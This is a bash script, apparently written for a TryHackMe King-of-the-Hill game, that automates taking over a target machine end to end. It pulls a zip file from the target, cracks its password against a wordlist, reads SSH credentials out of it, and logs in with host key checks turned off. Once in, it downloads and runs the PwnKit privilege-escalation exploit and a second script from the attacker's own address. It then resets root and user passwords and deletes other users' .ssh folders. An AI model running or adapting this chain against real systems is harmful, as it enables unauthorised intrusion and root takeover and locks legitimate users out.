#!/bin/bash

# Created by @HaruKey :)

# https://github.com/H4ruKey/KOTH

missing() {
  if ! command -v "$1" >/dev/null 2>&1; then
    echo "Install '$1' before running $0 script."
    exit 1
  fi
}

missing fcrackzip
missing unzip
missing sshpass

while getopts ":i:u:p:w:" opt; do
  case $opt in
    i) IP="$OPTARG" ;;
    u) username="$OPTARG" ;;
    p) new_password="$OPTARG" ;;
    w) Wordlist="$OPTARG" ;;
  esac
done
if [ -z "$IP" ] || [ -z "$username" ] || [ -z "$new_password" ] || [ -z "$Wordlist" ]; then
  echo "Usage: $0 -i 'The machine IP' -u 'Your username on thm' -p 'The new password' -w 'Wordlist Path'"
  exit 1
fi

rm -rf creds.txt 2>/dev/null
rm -rf file.zip 2>/dev/null

wget -qO - "$IP:3333" | base64 -d > file.zip

PASSWORD=$(fcrackzip -v -u -D -p "$Wordlist" file.zip | grep -o '== [a-zA-Z0-9]*$' | awk '{print $2}')

unzip -P "$PASSWORD" file.zip 

ssh_pass=$(cat creds.txt | grep 'fortuna:' | cut -d ':' -f 2)

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

sshpass -p "$ssh_pass" ssh -o StrictHostKeyChecking=no fortuna@"$IP" << EOF
    cd /tmp && wget http://$vpn/bin/PwnKit && chmod +x PwnKit && ./PwnKit
    cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
    echo "root:$new_password" | chpasswd
    echo "fortuna:$new_password" | chpasswd
    echo "hermes:$new_password" | chpasswd
    echo "kairos:$new_password" | chpasswd
    echo "tyche:$new_password" | chpasswd
    rm -rf /home/hermes/.ssh
    rm -rf /home/kairos/.ssh
EOF
